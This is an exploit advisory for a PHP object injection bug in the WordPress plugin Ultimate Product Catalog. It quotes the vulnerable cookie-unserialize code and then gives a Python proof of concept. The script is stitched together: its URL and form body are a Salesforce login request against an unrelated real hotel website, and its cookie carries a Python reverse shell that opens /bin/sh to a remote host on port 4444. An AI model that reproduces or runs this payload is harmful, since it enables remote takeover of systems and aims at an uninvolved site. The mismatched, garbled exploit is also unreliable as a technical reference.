# Exploit Title: [WP Plugin Ultimate Product Catalog 4.2.24 PHP Object Injection]
# Google Dork: [NA]
# Date: [Okt 30 2017]
# Exploit Author: [tomplixsee]
# Author blog : [cupuzone.wordpress.com]
# Vendor Homepage: [http://www.etoilewebdesign.com/plugins/ultimate-product-catalog/]
# Software Link: [https://wordpress.org/plugins/ultimate-product-catalogue/]
# Version: [<= 4.2.24]
# Tested on: [Ubuntu Server 16.04]
# CVE : [NA]
'''
tested on app version 4.2.23, 4.2.24

we can send an evil cookie (login not required) to vulnerable function
1. vulnerable code on Functions/Process_Ajax.php <= tested

   203 // Adds an item to the plugin's cart
   204 function UPCP_Add_To_Cart() {
   205 global $woocommerce;
   206 global $wpdb;
   207 global $items_table_name;
   208
   209 $WooCommerce_Checkout = get_option("UPCP_WooCommerce_Checkout");
   210
   211 if ($WooCommerce_Checkout == "Yes") {
   212 $WC_Prod_ID = $wpdb->get_var($wpdb->prepare("SELECT Item_WC_ID FROM $items_table_name WHERE Item_ID=%d", sanitize_text_field($_POST['prod_ID'])));
   213 echo "WC ID: " . $WC_Prod_ID . "<Br>";
   214 $woocommerce->cart->add_to_cart($WC_Prod_ID);
   215 }
   216
   217 if (isset($_COOKIE['upcp_cart_products'])) {
   218 $Products_Array = unserialize(str_replace('\"', '"', $_COOKIE['upcp_cart_products']));
   219 }
   220 else {
   221 $Products_Array = array();
   222 }
   223
   224 $Products_Array[] = $_POST['prod_ID'];
   225 $Products_Array = array_unique($Products_Array);
   226 setcookie('upcp_cart_products', serialize($Products_Array), time()+3600*24*3, "/");
   227 }
   228 add_action('wp_ajax_upcp_add_to_cart', 'UPCP_Add_To_Cart');
   229 add_action( 'wp_ajax_nopriv_upcp_add_to_cart', 'UPCP_Add_To_Cart' );

2. vulnerable code on Functions/Shortcodes.php <= not tested

POC
1. use a WP plugin to test php object injection,
like this one https://www.pluginvulnerabilities.com/2017/07/24/wordpress-plugin-for-use-in-testing-for-php-object-injection/

2. make a request
#-----------------------------------
#! /usr/bin/python
'''
import requests
url = "https://www.hilton.com.tr?r=1&other.LightningLoginForm.getForgotPasswordUrl=1&other.LightningLoginForm.getIsSelfRegistrationEnabled=1&other.LightningLoginForm.getIsUsernamePasswordEnabled=1&other.LightningLoginForm.getSelfRegistrationUrl=1";
data = "message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22109%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FLightningLoginFormController%2FACTION%24getIsUsernamePasswordEnabled%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3Aonb_LoginForm%22%2C%22params%22%3A%7B%7D%7D%2C%7B%22id%22%3A%22110%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FLightningLoginFormController%2FACTION%24getIsSelfRegistrationEnabled%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3Aonb_LoginForm%22%2C%22params%22%3A%7B%7D%7D%2C%7B%22id%22%3A%22111%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FLightningLoginFormController%2FACTION%24getForgotPasswordUrl%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3Aonb_LoginForm%22%2C%22params%22%3A%7B%7D%7D%2C%7B%22id%22%3A%22112%3Ba%22%2C%22descriptor%22%3A%22apex%3A%2F%2FLightningLoginFormController%2FACTION%24getSelfRegistrationUrl%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fc%3Aonb_LoginForm%22%2C%22params%22%3A%7B%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22f-ORwbkOzgxJoD8-NarJXg%22%2C%22app%22%3A%22siteforce%3AloginApp2%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AloginApp2%22%3A%22338ykgqhfadZmu7Hh52Itg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fbusiness-onboarding%2Fs%2Flogin%2F%3Fec%3D302%26startURL%3D%252Fbusiness-onboarding%252Fs%252F&aura.token=null"
headers = {
'Content-type': 'application/x-www-form-urlencoded',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
'Cookie': 'upcp_cart_products=O:20:"PHP_Object_Injection":0:{''''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.7.8",'4444'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''''}'
}
r = requests.post(url, data=data, headers=headers)

#print(r.content)
print(r,r.headers)
print(r.text)
#------------------------------------
